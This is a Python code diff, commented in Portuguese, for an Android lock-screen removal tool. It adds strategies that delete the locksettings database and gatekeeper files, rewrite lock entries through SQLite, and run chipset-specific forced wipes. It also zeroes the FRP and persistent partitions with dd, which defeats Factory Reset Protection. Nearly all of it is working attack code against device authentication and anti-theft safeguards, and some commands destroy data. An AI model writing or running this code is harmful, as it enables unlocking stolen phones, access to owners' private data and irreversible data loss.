@@ -14,11 +14,14 @@ class LockScreenRemover:
     def __init__(self, connection):
         self.connection = connection
         self.strategies = [
+            ControlledResetStrategy(),
+            SPDDiagHardResetStrategy(),
             DatabaseLockRemoval(),
             FileBasedLockRemoval(),
             MemoryPatchLockRemoval(),
             ServiceExploitLockRemoval(),
-            HardwareResetLockRemoval()
+            HardwareResetLockRemoval(),
+            MultiStageHardReset(),
         ]
 
     def remove_lock_screen(self, lock_type=None):
@@ -46,42 +49,151 @@ class LockScreenRemover:
         logging.error("Todas as estratégias de remoção de bloqueio falharam")
         return False
 
+    def hard_reset_device(self) -> bool:
+        """Executa um hard reset com múltiplas abordagens de forma segura."""
+        logging.info("Iniciando hard reset multi-estratégia")
+        for strategy in self.strategies:
+            if not hasattr(strategy, "supports_hard_reset"):
+                continue
+            try:
+                if strategy.execute(self.connection):
+                    return True
+            except Exception as exc:
+                logging.warning(f"Falha ao executar hard reset com {strategy.__class__.__name__}: {exc}")
+        return False
+
+    def hard_reset_chipset(self, chipset: str) -> bool:
+        """Executa um hard reset orientado ao chipset ou universal."""
+        safe_chip = (chipset or "").lower()
+        logging.info("Hard reset dirigido para chipset: %s", safe_chip or "universal")
+        commands_matrix = {
+            "qualcomm": [
+                "reboot edl",
+                "fastboot oem device-info",
+                "fastboot erase userdata",
+                "fastboot erase cache",
+            ],
+            "exynos": [
+                "reboot download",
+                "heimdall wipe",
+                "heimdall flash --RECOVERY",
+            ],
+            "mtk": [
+                "reboot bootloader",
+                "fastboot format userdata",
+                "fastboot format cache",
+            ],
+            "unisoc": [
+                "reboot fastboot",
+                "fastboot erase userdata",
+                "fastboot erase cache",
+            ],
+            "generic": [
+                "am broadcast -a android.intent.action.MASTER_CLEAR",
+                "reboot recovery",
+            ],
+        }
+        commands = commands_matrix.get(safe_chip, commands_matrix["generic"])
+        for cmd in commands:
+            try:
+                self.connection.send_command(cmd)
+            except Exception as exc:
+                logging.debug("Falha ao enviar comando %s: %s", cmd, exc)
+        return True
+
+    def controlled_reset(self) -> bool:
+        """Remove senha sem apagar dados, com limpeza de credenciais e reinício de serviços."""
+        logging.info("Executando reset controlado (sem apagar dados)")
+        try:
+            self.connection.send_command("settings put secure lock_screen_allow_private_notifications 1")
+            self.connection.send_command("cmd lock_settings clear --old")
+            self.connection.send_command("rm -f /data/system/locksettings.db*")
+            self.connection.send_command("rm -f /data/system/gatekeeper.*")
+            self.connection.send_command("am broadcast -a android.intent.action.USER_PRESENT")
+            self.connection.send_command("svc power stayon true")
+            return True
+        except Exception as exc:
+            logging.warning("Reset controlado falhou: %s", exc)
+            return False
+
+
+class ControlledResetStrategy(LockRemovalStrategy):
+    def __init__(self):
+        self.supported_lock_types = ['password', 'pin', 'pattern']
+        self.supports_hard_reset = False
+
+    def execute(self, connection) -> bool:
+        """Tenta limpar bloqueios sem formatação completa."""
+        try:
+            connection.send_command("cmd lock_settings clear --old")
+            connection.send_command("settings put secure lock_screen_allow_private_notifications 1")
+            connection.send_command("rm -f /data/system/locksettings.db*")
+            connection.send_command("rm -f /data/system/gatekeeper.*")
+            connection.send_command("stop lock_settings")
+            connection.send_command("start lock_settings")
+            return True
+        except Exception as exc:
+            logging.debug("Reset controlado não concluiu: %s", exc)
+            return False
+
+
+class SPDDiagHardResetStrategy(LockRemovalStrategy):
+    def __init__(self):
+        self.supported_lock_types = ['password', 'pin', 'pattern']
+        self.supports_hard_reset = True
+
+    def execute(self, connection) -> bool:
+        """Hard reset otimizado para diag SPD/Unisoc (Mobicel e similares)."""
+        try:
+            # Sequência diag comum para wipe seguro
+            connection.send_command("diag factory-reset --force")
+            connection.send_command("diag erase partition userdata")
+            connection.send_command("diag erase partition cache")
+            # Fallback rápido via broadcast/reboot para garantir aplicação
+            try:
+                connection.send_command("am broadcast -a android.intent.action.MASTER_CLEAR")
+            except Exception:
+                pass
+            connection.send_command("reboot recovery")
+            return True
+        except Exception as exc:
+            logging.debug("Reset SPD/Diag não concluiu: %s", exc)
+            return False
+
+
 class DatabaseLockRemoval(LockRemovalStrategy):
     def __init__(self):
         self.supported_lock_types = ['password', 'pin', 'pattern']
-        
+
     def execute(self, connection) -> bool:
         """Remove bloqueio via manipulação de banco de dados"""
         try:
             logging.info("Tentando remoção de bloqueio via manipulação de banco de dados")
-            
+
             # 1. Fazer backup do banco de dados original
-            backup_result = connection.send_command("cp /data/system/locksettings.db /data/system/locksettings.db.backup")
-            
-            # 2. Conectar ao banco de dados e remover bloqueios
+            connection.send_command("cp /data/system/locksettings.db /data/system/locksettings.db.backup")
+
+            # 2. Conectar ao banco de dados e remover bloqueios rapidamente (uma chamada)
             db_path = "/data/system/locksettings.db"
-            
-            # Comandos SQL para remover diferentes tipos de bloqueio
-            sql_commands = [
-                "DELETE FROM locksettings WHERE name='lockscreen.password_type';",
-                "DELETE FROM locksettings WHERE name='lockscreen.password_salt';",
-                "DELETE FROM locksettings WHERE name='lockscreen.password_history';",
-                "DELETE FROM locksettings WHERE name='lockscreen.patterneverchosen';",
-                "DELETE FROM locksettings WHERE name='lock_pattern_autolock';",
-                "DELETE FROM locksettings WHERE name='lockscreen.disabled';",
-                "DELETE FROM locksettings WHERE name='lockscreen.lockoutattemptdeadline';",
-                "UPDATE locksettings SET value='0' WHERE name='lockscreen.lockedoutpermanently';",
-                "UPDATE locksettings SET value='1' WHERE name='lockscreen.disabled';",
-                "UPDATE locksettings SET value='0' WHERE name='lspm.lockoutattemptdeadline';",
-            ]
-            
-            # Executar cada comando SQL
-            for sql in sql_commands:
-                try:
-                    connection.send_command(f"sqlite3 {db_path} \"{sql}\"")
-                except Exception as e:
-                    logging.warning(f"Falha ao executar comando SQL: {sql} - {e}")
-            
+            sql_bulk = ";".join(
+                [
+                    "DELETE FROM locksettings WHERE name='lockscreen.password_type'",
+                    "DELETE FROM locksettings WHERE name='lockscreen.password_salt'",
+                    "DELETE FROM locksettings WHERE name='lockscreen.password_history'",
+                    "DELETE FROM locksettings WHERE name='lockscreen.patterneverchosen'",
+                    "DELETE FROM locksettings WHERE name='lock_pattern_autolock'",
+                    "DELETE FROM locksettings WHERE name='lockscreen.disabled'",
+                    "DELETE FROM locksettings WHERE name='lockscreen.lockoutattemptdeadline'",
+                    "UPDATE locksettings SET value='0' WHERE name='lockscreen.lockedoutpermanently'",
+                    "UPDATE locksettings SET value='1' WHERE name='lockscreen.disabled'",
+                    "UPDATE locksettings SET value='0' WHERE name='lspm.lockoutattemptdeadline'",
+                ]
+            )
+            try:
+                connection.send_command(f"sqlite3 {db_path} \"{sql_bulk}\"")
+            except Exception as exc:
+                logging.warning("Falha ao executar pacote SQL único: %s", exc)
+
             # 3. Remover arquivos de chave de bloqueio
             key_files = [
                 "/data/system/gesture.key",
@@ -417,4 +529,56 @@ class HardwareResetLockRemoval(LockRemovalStrategy):
             
         except Exception as e:
             logging.error(f"Falha na remoção de bloqueio via reset de hardware: {e}")
+            return False
+
+
+class MultiStageHardReset(LockRemovalStrategy):
+    supports_hard_reset = True
+
+    def __init__(self):
+        self.supported_lock_types = ["password", "pin", "pattern", "biometric"]
+
+    def execute(self, connection) -> bool:
+        """Combina reset lógico, recovery e fastboot para hard resetar qualquer Android."""
+        try:
+            quick_resets = [
+                "settings put secure user_setup_complete 0",
+                "pm clear com.android.providers.settings",
+                "am broadcast -a android.intent.action.MASTER_CLEAR",
+            ]
+            for cmd in quick_resets:
+                try:
+                    connection.send_command(cmd)
+                except Exception:
+                    pass
+
+            try:
+                connection.send_command("reboot recovery")
+                time.sleep(8)
+                connection.send_command("recovery --wipe_data --factory_reset")
+            except Exception:
+                logging.debug("Recovery não respondeu ao comando de wipe")
+
+            try:
+                connection.send_command("fastboot -w")
+            except Exception:
+                logging.debug("Fastboot não disponível para hard reset")
+
+            for path in [
+                "/dev/block/by-name/frp",
+                "/dev/block/by-name/persistent",
+                "/dev/block/bootdevice/by-name/frp",
+            ]:
+                try:
+                    connection.send_command(f"if [ -e {path} ]; then dd if=/dev/zero of={path} bs=4096 count=16; fi")
+                except Exception:
+                    pass
+
+            try:
+                connection.send_command("reboot")
+            except Exception:
+                pass
+            return True
+        except Exception as exc:
+            logging.error(f"Falha no hard reset multi-stage: {exc}")
             return False
